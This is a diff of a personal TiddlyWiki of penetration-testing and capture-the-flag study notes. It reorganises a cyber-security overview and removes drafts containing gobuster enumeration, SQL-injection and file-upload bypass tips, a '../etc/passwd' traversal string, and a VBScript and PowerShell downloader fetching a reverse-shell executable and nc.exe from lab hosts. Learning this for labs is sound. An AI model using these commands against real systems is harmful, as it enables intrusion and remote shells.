@@ -281,9 +281,9 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 
 <li>Domain Name System</li>
 
-<li>Draft of 'LinEnum'</li>
+<li>Draft of 'Cyber Security'</li>
 
-<li>Draft of 'Penetration Testing Framework'</li>
+<li>Draft of 'LinEnum'</li>
 
 <li>Entertainment</li>
 
@@ -9670,8 +9670,8 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 <div created="20191104231946357" modified="20210808134423222" title="$:/state/tab/moresidebar-1850697562">
 <pre>$:/core/ui/MoreSideBar/All</pre>
 </div>
-<div created="20191104231909850" modified="20211027130534038" title="$:/state/tab/sidebar--595412856">
-<pre>$:/core/ui/SideBar/Open</pre>
+<div created="20191104231909850" modified="20211027132545471" title="$:/state/tab/sidebar--595412856">
+<pre>TableOfContents</pre>
 </div>
 <div created="20210808122159283" modified="20210808122159827" title="$:/state/toc/TableOfContents-Programming--118161433">
 <pre>close</pre>
@@ -9682,7 +9682,7 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 <div created="20210810022253593" modified="20210825230930363" title="$:/state/toc/TableOfContents/Tech-Game Development--118161433">
 <pre>close</pre>
 </div>
-<div created="20211027101744341" list="[[Cyber Security]] [[Draft of 'Penetration Testing Framework']] [[File Transfers]] Scanning CrappyMakerProgrammer" modified="20211027132416654" title="$:/StoryList">
+<div created="20211027132533945" list="[[Draft of 'Cyber Security']] [[Network Services]] Wordpress CrappyMakerProgrammer" modified="20211027132720856" title="$:/StoryList">
 <pre></pre>
 </div>
 <div plugin-type="info" title="$:/temp/info-plugin" type="application/json">
@@ -10736,81 +10736,70 @@ Enumerate the host. Use domain names such as those
 dig axfr @10.10.10.13 cronos.htb
 ```</pre>
 </div>
+<div created="20191219104819416" draft.of="Cyber Security" draft.title="Cyber Security" modified="20211027132623562" tags="Tech" title="Draft of 'Cyber Security'">
+<pre>A good &amp; easy way to get started in Cyber Security is to just participate in Capture the Flag Competitions, ans google for writeups, understanding &amp; solutions along the way
+
+! Penetration Testing Framework
+
+[[Penetration Testing Framework]]
+
+# [[Scanning]]
+# Enumeration: [[Network Services]]
+# [[Exploitation]]
+# [[Privilege Escalation]]
+# [[Getting Shells]]
+# [[File Transfers]]
+# [[Pivoting]]
+
+! Exercises
+
+[[Cyber Security Exercises]]
+
+
+! Categories
+
+!! Main
+
+# [[Reverse Engineering]]
+# [[Binary Exploitation / Pwn]]
+# [[OSINT]]
+# [[Web Hacking]]
+## https://book.hacktricks.xyz/pentesting/pentesting-web/nginx
+# [[Cyber Forensics]]
+
+
+
+
+!!Network
+#Wireshark
+
+!Forensics
+
+
+
+
+
+!!Cryptography
+# Base64, Caesar Cipher. and other encoding methods https://cryptii.com/
+
+!!Miscellaneous
+# Programming with Pictures: https://www.bertnase.de/npiet/
+# https://en.wikipedia.org/wiki/Brainfuck 
+
+
+!! Restoring Deleted Files
+
+From ext4 File system [[*|https://unix.stackexchange.com/questions/122305/undelete-a-just-deleted-file-on-ext4-with-extundelete]]: 
+`extundelete /dev/sda4 --restore-all` (can replace `/dev/sda4` with disk image)
+
+!! ICS
+
+Saleae Logic Analyser
+
+Example CTF Challenge: https://jloh02.github.io/ctf/stack-the-flags-2020#internet-of-things</pre>
+</div>
 <div modified="20210913120411045" title="Draft of 'LinEnum'">
 <pre></pre>
-</div>
-<div created="20210927160738058" draft.of="Penetration Testing Framework" draft.title="Penetration Testing Framework" modified="20211027132415147" title="Draft of 'Penetration Testing Framework'">
-<pre>! Overview
-
-This is a basic Penetration Testing Outline I made
-
-! General Enumeration
-
-[[Scanning]]
-
-! Service Enumeration
-
-# For each service
-## Access, Read &amp; Write if possible
-## Using the Version number from scans, find [[Common Vulnerabilities and Exposures]]
-## If You don't know the service (or nmap also doesn't), try web browser
-
-
-
-[[Network Services]]
-
-
-
-!! Web Hacking
-
-!!! Directory Enumeration
-
-```
-dirb &lt;url&gt;
-gobuster dir -k -x html,js,php,txt -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u &lt;URL&gt;
-```
-
-Look through at log down everything on everypage. Find all clues.
-
-!!! SQL Injection
-
-# Whenever you find a user page, bruteforce SQL injection payloads.
-## https://github.com/payloadbox/sql-injection-payload-list
-# If it is something like ?id=1, you can try enumerating all the ids by doing id=2, id=3
-## Can move on to SQL Injection (eg. UNION)
-
-!! File Upload Vulnerability
-
-# Upload a file through website/ FTP if possible
-# Access the payload through the web browser to run the php code
-
-To bypass mandate of extension, can try name.php.jpg for example. It will run as a php file [[*|https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload]]
-
-!!! Local File Inclusion
-
-If there is a POST/GET parameter with a path, you can try Directory inclusion by `../../../../../etc/passwd` or something
-
-!!! Content Management Systems
-
-# Vulnerability Scanning
-
-! Exploitation
-
-# [[Password Cracking]]
-# [[OSCP Style Windows Buffer Overflow]]
-# [[Getting Shells]]
-
-! Privilege Escalation
-
-[[Privilege Escalation]]
-
-! Post Exploitation
-
-# Upload privilege esclation scripts to run
-
-!! File Transfers
-
-[[File Transfers]]</pre>
 </div>
 <div created="20191105030432236" modified="20191105034127657" title="Entertainment">
 <pre>! Anime &amp; Manga
@@ -10909,7 +10898,7 @@ msf (handler) &gt; exploit
 # once victim restarts and logons, we will get a meterpreter shell
 ```</pre>
 </div>
-<div created="20211002174442005" modified="20211027132428882" title="File Transfers">
+<div created="20211002174442005" modified="20211002174449254" title="File Transfers">
 <pre>! Windows
 
 ```
@@ -10920,43 +10909,7 @@ echo bin &gt;&gt; ftp.txt
 echo GET winPEAS.bat &gt;&gt; ftp.txt
 echo bye &gt;&gt; ftp.txt
 ftp -v -n -s:ftp.txt
-```
 
-```
-echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbs
-echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs
-echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs
-echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs
-echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs
-echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs
-echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts &gt;&gt; wget.vbs
-echo Err.Clear &gt;&gt; wget.vbs
-echo Set http = Nothing &gt;&gt; wget.vbs
-echo Set http = CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) &gt;&gt; wget.vbs
-echo If http Is Nothing Then Set http = CreateObject(&quot;WinHttp.WinHttpRequest&quot;) &gt;&gt; wget.vbs
-echo If http Is Nothing Then Set http = CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;) &gt;&gt; wget.vbs
-echo If http Is Nothing Then Set http = CreateObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt; wget.vbs
-echo http.Open &quot;GET&quot;,strURL,False &gt;&gt; wget.vbs
-echo http.Send &gt;&gt; wget.vbs
-echo varByteArray = http.ResponseBody &gt;&gt; wget.vbs
-echo Set http = Nothing &gt;&gt; wget.vbs
-echo Set fs = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; wget.vbs
-echo Set ts = fs.CreateTextFile(StrFile,True) &gt;&gt; wget.vbs
-echo strData = &quot;&quot; &gt;&gt; wget.vbs
-echo strBuffer = &quot;&quot; &gt;&gt; wget.vbs
-echo For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs
-echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) &gt;&gt; wget.vbs
-echo Next &gt;&gt; wget.vbs
-echo ts.Close &gt;&gt; wget.vbs
-```
-
-```
-cscript wget.vbs http://10.10.14.12:8000/1234_rev.exe rev.exe
-```
-
-
-```
-powershell -c &quot;wget http://10.10.14.4:8000/nc.exe -Outfile nc.exe&quot;
 ```</pre>
 </div>
 <div created="20210810053719661" modified="20210810142342904" tags="TableOfContents" title="Finance">
@@ -12392,8 +12345,18 @@ Installing Metasploit [[*|https://gist.github.com/dafthack/8aa4ff60cd9352448a372
 curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall
 ```</pre>
 </div>
-<div created="20210913121056916" modified="20210913121211468" title="Wordpress">
-<pre>! Exploit
+<div created="20210913121056916" modified="20211027132831729" title="Wordpress">
+<pre>! Exploitation
+
+!! Plugins
+
+The plugins may have CVEs which we can exploit to get RCE
+
+```
+wpscan --url &lt;url&gt;
+```
+
+!! Upload a Reverse Shell
 
 Getting a reverse shell when already logged in [[*|https://www.hackingarticles.in/wordpress-reverse-shell/]] 
 
